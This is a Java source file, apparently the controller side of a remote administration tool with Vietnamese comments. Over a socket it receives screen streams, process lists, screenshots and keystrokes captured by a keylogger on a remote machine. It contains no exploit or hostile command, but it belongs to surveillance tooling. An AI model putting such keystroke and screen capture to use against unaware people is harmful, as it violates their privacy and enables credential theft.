package Client;

import java.awt.FileDialog;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.LinkedList;

import javax.imageio.ImageIO;
import javax.swing.JFileChooser;
import javax.swing.JOptionPane;

import General.AppRunning;
import General.Commands;
import General.ProcessWindow;

public class CentralReader implements Runnable {
	
	private ClientForm client = null;
	private Socket socket = null;
	private DataInputStream dataInputStream = null;
	private ReceiveScreen receiveScreen = null;
	private RemoteForm remoteForm = null;
	private ProcessManagementForm processManagementForm = null;
	private KeyloggerForm keyloggerForm = null;
	private boolean flag = true;
	
	public CentralReader(Socket socket, ClientForm client) throws IOException {
		this.setClient(client);
		this.setSocket(socket);
		this.setRemoteForm(client.getRemoteForm());
		this.setKeyloggerForm(client.getKeyloggerForm());
		this.setProcessManagementForm(client.getProcessManagementForm());
		dataInputStream = new DataInputStream(socket.getInputStream());
		receiveScreen = new ReceiveScreen(socket, client);
	}

	@Override 
	public void run() {
		// TODO Auto-generated method stub
		while(this.flag) {
			
			try { 
				int type = dataInputStream.readInt();
//				System.out.println("type: " + type);
				Commands commands = Commands.fromAbbrev(type);
				switch (commands) {
				case SCREEN: {
					receiveScreen.receiveScreenByCommands(dataInputStream.readInt());
					break;
				}
				case RESPONSE_PROCESS: {
					System.out.println("Bat dau doc process...");
					LinkedList<ProcessWindow> list = new LinkedList<ProcessWindow>();
					
					int size = dataInputStream.readInt();
					
					for(int i = 0; i < size; ++i) {
						String ImageName = dataInputStream.readUTF();
						int PID = dataInputStream.readInt();
						String SessionName = dataInputStream.readUTF();
						int SessionIDs = dataInputStream.readInt();
						String MemUsage = dataInputStream.readUTF();
						list.add(new ProcessWindow(ImageName, PID, SessionName, SessionIDs, MemUsage));
					}
					
//					for (ProcessWindow processWindow : list) {
//						System.out.println(processWindow);
//					}
					
					processManagementForm.setListProcess(list);
					break;
				}
				case ERROR_PROCESS: {
					String msg = dataInputStream.readUTF();
					JOptionPane.showMessageDialog(processManagementForm, msg, "Thông báo", JOptionPane.WARNING_MESSAGE);
					break;
				}
				case RESPONSE_SCREEN_SHOT: {
					// Đọc kích thước của ảnh trước
					byte[] sizeAr = new byte[4];
					
					dataInputStream.readFully(sizeAr);
					// datadataInputStream

					int size = ByteBuffer.wrap(sizeAr).asIntBuffer().get();

					// Nhận dữ liệu ảnh
					byte[] imageBytes = new byte[size];
					dataInputStream.readFully(imageBytes);
					// // datadataInputStream

					// Chuyển đổi lại thành BufferedImage
					BufferedImage receivedImage = ImageIO.read(new ByteArrayInputStream(imageBytes));
					
					
					// Tạo FileDialog để mở giao diện lưu file của hệ điều hành
			        FileDialog fileDialog = new FileDialog(remoteForm, "Chọn nơi lưu ảnh", FileDialog.SAVE);

			        // Hiển thị FileDialog
			        fileDialog.setVisible(true);

			        // Kiểm tra xem người dùng có chọn file không
			        String directory = fileDialog.getDirectory();
			        String fileName = fileDialog.getFile();

			        if (directory != null && fileName != null) {
			            // Tạo đối tượng file từ đường dẫn và tên file mà người dùng chọn
			            File fileToSave = new File(directory, fileName + ".png");

			            try {
			                // Ghi ảnh dưới định dạng PNG
			                ImageIO.write(receivedImage, "png", fileToSave);
			                JOptionPane.showMessageDialog(null, "Ảnh đã được lưu thành công!");
			            } catch (IOException e) {
			                e.printStackTrace();
			                JOptionPane.showMessageDialog(null, "Lỗi khi lưu ảnh!", "Error", JOptionPane.ERROR_MESSAGE);
			            }
			        } else {
			            System.out.println("Người dùng đã hủy thao tác lưu.");
			        }
					break;
				}
				case PRESS_KEY_KEYLOGGER: {
					String keyChar = dataInputStream.readUTF();
					keyloggerForm.listening(keyChar);
					break;
				}
				case RESPONSE_APP_RUNNING: {
					System.out.println("Bat dau doc app running ...");
					LinkedList<AppRunning> list = new LinkedList<AppRunning>();
					
					int size = dataInputStream.readInt();
					
					for(int i = 0; i < size; ++i) {
						String Name = dataInputStream.readUTF();
						int Id = dataInputStream.readInt();
						list.add(new AppRunning(Name, Id));
					}
					
//					for (AppRunning appRunning : list) {
//						System.out.println(appRunning.toString());
//					}
					break;
				}
				default:
//					throw new IllegalArgumentException("Unexpected value: " + type);
//					System.out.println("Not data");
					break;
				}
			} catch (Exception e) {
				break;
			}
		}
	}

	public Socket getSocket() {
		return socket;
	}

	public void setSocket(Socket socket) {
		this.socket = socket;
	}

	public ClientForm getClient() {
		return client;
	}

	public void setClient(ClientForm client) {
		this.client = client;
	}

	public RemoteForm getRemoteForm() {
		return remoteForm;
	}

	public void setRemoteForm(RemoteForm remoteForm) {
		this.remoteForm = remoteForm;
	}

	public KeyloggerForm getKeyloggerForm() {
		return keyloggerForm;
	}

	public void setKeyloggerForm(KeyloggerForm keyloggerForm) {
		this.keyloggerForm = keyloggerForm;
	}
	
	public ProcessManagementForm getProcessManagementForm() {
		return processManagementForm;
	}
	
	public void setProcessManagementForm(ProcessManagementForm processManagementForm) {
		this.processManagementForm = processManagementForm;
	}
	
	public void stopThread() {
		this.flag = false;
	}
}
